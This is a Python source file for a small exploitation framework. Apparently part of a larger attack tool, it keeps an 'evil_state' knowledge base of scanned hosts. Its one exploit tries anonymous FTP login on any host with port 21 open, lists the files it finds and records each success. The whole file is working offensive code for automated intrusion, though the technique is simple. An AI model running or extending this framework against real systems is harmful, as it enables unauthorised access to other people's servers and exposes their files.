import logging
from rich.console import Console
from rich.table import Table

# A (very) simple framework for exploits.
# In a real-world scenario, this would be much more complex, likely using a
# standardized library like Metasploit or similar.

class ExploitationManager:
    def __init__(self, evil_state, console=None):
        self.evil_state = evil_state
        self.console = console if console else Console()
        self.available_exploits = [
            AnonymousFTPLoginExploit()
        ]

    def find_and_run_exploits(self, target_ip=None):
        """
        Scans the knowledge base for potential vulnerabilities and attempts to run
        any matching exploits. If a target_ip is provided, only that host is targeted.
        """
        network_map = self.evil_state["knowledge_base"]["network_map"]["hosts"]
        hosts_to_scan = {target_ip: network_map[target_ip]} if target_ip and target_ip in network_map else network_map

        if not hosts_to_scan:
            self.console.print("[yellow]No hosts in knowledge base to exploit.[/yellow]")
            return

        self.console.print(f"[bold cyan]Starting exploitation phase against {len(hosts_to_scan)} target(s)...[/bold cyan]")

        for ip, host_data in hosts_to_scan.items():
            if not host_data.get("ports"):
                continue

            for exploit in self.available_exploits:
                if exploit.is_vulnerable(ip, host_data):
                    self.console.print(f"[bold green]SUCCESS:[/bold green] Target [bold]{ip}[/bold] is vulnerable to [bold]{exploit.name}[/bold].")
                    try:
                        result = exploit.run(ip, host_data)
                        self._log_exploitation_result(ip, exploit.name, result)
                        self.console.print(f"  [+] Exploit successful. Result:")
                        self.console.print(result)

                    except Exception as e:
                        self.console.print(f"  [bold red]FAIL:[/bold red] Exploit failed with error: {e}")
                        logging.error(f"Exploit {exploit.name} failed against {ip}: {e}")

    def _log_exploitation_result(self, ip, exploit_name, result):
        """Logs the successful exploitation to the knowledge base."""
        if "exploits" not in self.evil_state["knowledge_base"]:
            self.evil_state["knowledge_base"]["exploits"] = {}
        if ip not in self.evil_state["knowledge_base"]["exploits"]:
            self.evil_state["knowledge_base"]["exploits"][ip] = []

        self.evil_state["knowledge_base"]["exploits"][ip].append({
            "exploit": exploit_name,
            "result": result
        })


class BaseExploit:
    """Base class for all exploits."""
    name = "Base Exploit"
    description = "This is a template."
    services = [] # List of services this exploit targets, e.g., ['ftp', 'vsftpd']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if the target is vulnerable based on port scan data.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError

    def run(self, ip, host_data):
        """
        Executes the exploit.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError


class AnonymousFTPLoginExploit(BaseExploit):
    """
    Checks for and attempts to log into an FTP server with anonymous credentials.
    """
    name = "Anonymous FTP Login"
    description = "Tries to log in to an FTP server using 'anonymous' and 'anonymous' credentials."
    services = ['ftp']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if port 21 is open and the service is identified as FTP.
        A more advanced check could look for specific banners.
        """
        for port, port_data in host_data.get("ports", {}).items():
            if port == "21" and port_data.get("service") == "ftp":
                # In a real scenario, you might check for banners indicating anonymous access is allowed.
                # For this PoC, we'll just try to connect.
                return True
        return False

    def run(self, ip, host_data):
        """
        Attempts to connect to the FTP server and list files.
        """
        import ftplib
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login('anonymous', 'anonymous')
                files = ftp.nlst()
                return {"status": "success", "files": files}
        except ftplib.all_errors as e:
            # This might happen if login is rejected, which is common.
            # We could make the `is_vulnerable` check more robust to avoid this.
            return {"status": "failed", "reason": str(e)}